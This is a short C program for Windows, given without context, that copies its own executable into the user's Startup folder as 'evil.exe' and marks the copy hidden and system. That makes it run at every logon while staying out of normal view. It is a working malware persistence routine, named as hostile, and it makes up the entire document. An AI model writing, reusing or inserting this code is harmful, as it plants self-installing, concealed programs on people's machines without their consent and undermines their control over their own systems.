#include <windows.h>
#include <shlobj.h>

int main() {
    char selfPath[MAX_PATH];
    char startupPath[MAX_PATH];
    char destPath[MAX_PATH];

    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    SHGetSpecialFolderPathA(NULL, startupPath, CSIDL_STARTUP, FALSE);
    wsprintfA(destPath, "%s\\evil.exe", startupPath);

    CopyFileA(selfPath, destPath, FALSE);
    SetFileAttributesA(destPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return 0;
}
